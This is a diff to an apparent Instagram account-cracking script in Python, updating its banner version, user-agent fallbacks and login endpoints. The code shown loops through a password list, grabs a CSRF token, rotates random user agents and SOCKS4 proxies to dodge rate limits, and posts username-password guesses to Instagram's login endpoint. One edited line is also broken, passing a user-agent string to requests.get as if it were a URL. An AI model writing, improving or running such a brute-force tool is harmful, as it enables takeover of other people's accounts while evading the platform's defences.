@@ -29,7 +29,7 @@ ___logo___ = (f"""{H}
 {T}║  {U}██║██║ ╚████║███████║   ██║   ██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗  {T}║
 {T}║  {U}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  {T}║
 {T}║                                                                                        {T}║
-{T}║                                                                        {A}VERSION{P}: {J}05.05  {T}║
+{T}║                                                                        {A}VERSION{P}: {J}BETA.01{T}║
 {T}║                                                                                        {T}║
 {T}╚════════════════════════════════════════════════════════════════════════════════════════╝
 
@@ -400,8 +400,7 @@ class ___crack___:
         try:
             ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
-            ___useragent = ('Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US',
-                            'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
+            ___useragent = ('Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
                             'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36',
                             'Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
                             'Mozilla/5.0 (Linux; Android 11; Nokia 2.4 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 Instagram 214.1.0.29.120 Android (30/11; 280dpi; 720x1529; HMD Global/Nokia; Nokia 2.4; WVR_sprout; mt6762; es_MX; 333717253',
@@ -417,12 +416,13 @@ class ___crack___:
                             'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                             'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                             'Windows; U; MSIE 9.0; WIndows NT 9.0; en-US')
-            ___roz = requests.get('Instagram 5.1.7 Android (18/4.3; 320dpi; 720x1280; samsung; SGH-I747M; d2can; qcom; en_CA')
+            ___roz = requests.get('Instagram 5.1.7 Android (18/4.3; 320dpi; 720x1280; samsung; SGH-I747M; d2can; qcom; en_CA',
+                                  'Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US')
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://z-p42.www.instagram.com/')
-                ___login = ('https://z-p42.www.instagram.com/accounts/login/ajax/')
+                ___url = ('https://i.instagram.com/')
+                ___login = ('https://i.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
@@ -431,7 +431,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p2.www.instagram.com/accounts/login/',
+                'Referer': 'https://i.instagram.com/api/v1/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
